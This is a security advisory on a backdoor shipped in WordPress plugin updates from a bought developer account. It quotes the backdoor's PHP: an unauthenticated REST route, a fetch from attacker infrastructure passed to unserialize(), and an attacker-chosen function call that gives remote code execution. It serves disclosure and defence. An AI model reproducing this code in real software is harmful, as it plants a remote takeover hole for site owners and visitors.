---
title: "WordPress Backdoor"
vendor: "WordPress"
class: "Supply-chain backdoor"
severity: "Critical"
status: "Disclosed"
date: 2026-02-07
cve: "CVE-2026-6443"
link: "https://cooties.io/blog/project-umbra/"
cvss:
  - { version: "3.1", score: 9.8, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" }
lede: "A backdoored plugin update adds a public REST endpoint that unserializes attacker-supplied data."
summary: "Unauthenticated remote code execution. A backdoored plugin update added a public REST endpoint. The endpoint fetches a payload from attacker infrastructure and passes it to unserialize(), which leads to PHP object injection and code execution. CVSS 9.8. Affects every plugin from the compromised account."
---

## Overview

The EssentialPlugin developer account published about 31 plugins with more than 400,000 combined installs. Someone bought the account on Flippa and shipped a backdoor in routine plugin updates. The buyer controlled the developer account itself, not individual sites, so each plugin kept its existing install base and update channel.

The backdoor gives an unauthenticated attacker remote code execution in three steps:

1. A public REST endpoint accepts requests with no authentication.
2. The endpoint fetches data from attacker infrastructure and passes it to `unserialize()`.
3. The unserialized data picks a function and its arguments, and the plugin calls that function.

On affected sites, the backdoor also injected SEO spam that the sites served to crawlers.

## The wpos-analytics module

The backdoor lives in `wpos-analytics`, a bundled module that presents itself as usage analytics. The module is byte-for-byte identical in Accordion and Accordion Slider v1.4.5 and v1.4.6. So the backdoor predates v1.4.6, the version that was reported.

## The REST endpoint

`Wpos_Anylc_Admin::wpos_rest_api_init()` registers a REST route for each affected plugin:

```php
public function wpos_rest_api_init() {
    if ( !empty( $this->analytics_slugs ) ) {
        add_filter( 'rest_pre_serve_request', array($this, 'wpos_cors_headers'), 10, 3 );

        foreach ( $this->analytics_slugs as $product_slug ) {
            register_rest_route(
                $product_slug . '/v1',
                '/analytics/',
                array(
                    'methods'             => 'POST',
                    'callback'            => array( $this, 'wpos_handle_analytics_request' ),
                    'permission_callback' => '__return_true',
                )
            );
        }
    }
}
```

The route's `permission_callback` is `'__return_true'`, so the route requires no authentication. An unauthenticated `POST` to `/{plugin-slug}/v1/analytics/` reaches `wpos_handle_analytics_request()`. That handler maps the `productID` parameter to a loaded plugin and calls `fetch_ver_info()`.

## Deserialization of the remote response

`fetch_ver_info()` requests a URL on `analytics.essentialplugin.com`, which is hardcoded in `$this->analytics_endpoint`. It passes the response body to `unserialize()`:

```php
public $analytics_endpoint = 'https://analytics.essentialplugin.com';

public function fetch_ver_info( $product_id, $curr_version ) {
    $url = $this->analytics_endpoint . '/plugin_info/' . $product_id . '/'
         . '?version=' . urlencode($curr_version)
         . '&site_url=' . urlencode(get_site_url()) . '&live=1';
    $data = @file_get_contents($url);
    if (!$data) {
        $this->status = 'offline';
        return false;
    }

    $info = @unserialize($data);

    if ($info instanceof self) {
        $this->release_date  = $info->release_date;
        $this->status        = $info->status;
        $this->write         = $info->write;
        $this->version_cache = $info->version_cache;
        $this->changelog     = $info->changelog;
    }
    // ...
}
```

The endpoint is attacker infrastructure, so the attacker controls the response. `unserialize()` runs on it with no restriction. If the result is an instance of the class, the plugin copies its properties onto `$this`, including `write`.

## Code execution

`version_info_clean()` uses `$this->write` as a callable:

```php
public function version_info_clean() {
    if ($this->status === 'valid' && $this->changelog && !$this->isOutdated()) {
        $clean = $this->write;
        @$clean($this->version_cache, $this->changelog);
    }
}
```

`$clean($this->version_cache, $this->changelog)` calls the value of `$this->write` as a function. All three values (`write`, `version_cache`, and `changelog`) come from the unserialized response. The attacker picks the function and both of its arguments.

Combined with the unauthenticated REST route, this gives remote code execution from an unauthenticated request.

## Disclosure

The backdoor was identified in Accordion and Accordion Slider v1.4.6 before any CVE existed. CVE-2026-6443 (CVSS 9.8) was assigned later and covers every plugin that the compromised account published. WordPress.org removed all of them.
